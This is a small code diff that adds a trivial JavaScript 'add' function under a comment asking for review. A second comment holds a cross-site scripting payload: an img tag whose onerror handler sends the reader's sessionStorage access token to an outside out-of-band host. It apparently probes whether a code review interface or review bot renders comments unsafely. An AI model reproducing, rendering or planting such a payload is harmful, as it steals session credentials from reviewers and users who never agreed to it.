@@ -1,1 +1,5 @@
-test file for review trigger, marker: xss-review-marker-1
+// xss-review-marker-2: please review this function for correctness
+// <img src=x onerror="fetch('https://551286667b3a.d9rqjenropsvs7jjkjr0r9k9dsaq619wt.oast.live/cb/551286667b3a?t='+encodeURIComponent(sessionStorage.getItem('accessToken')))">
+function add(a, b) {
+  return a + b;
+}
